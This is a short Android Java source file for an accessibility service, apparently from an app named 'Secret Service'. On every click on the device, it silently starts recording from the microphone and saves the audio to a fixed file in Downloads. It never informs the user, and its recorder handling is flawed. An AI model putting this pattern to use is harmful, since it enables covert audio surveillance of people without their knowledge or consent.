package com.moutamid.secretservice.services;

import static android.os.Environment.getExternalStoragePublicDirectory;

import android.accessibilityservice.AccessibilityService;
import android.media.MediaRecorder;
import android.os.Environment;
import android.view.accessibility.AccessibilityEvent;

import java.io.IOException;

public class MyAccessibilityService extends AccessibilityService {

    private MediaRecorder mediaRecorder;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            startRecordingAudio();
        }
    }

    private void startRecordingAudio() {
        mediaRecorder = new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);

        String filename = getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) + "/Secret Service/Audio/recording.3gp";
        mediaRecorder.setOutputFile(filename);

        try {
            mediaRecorder.prepare();
            mediaRecorder.start();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void stopRecordingAudio() {
        mediaRecorder.stop();
        mediaRecorder.release();
        mediaRecorder = null;
    }

    @Override
    public void onInterrupt() {
        stopRecordingAudio();
    }
}

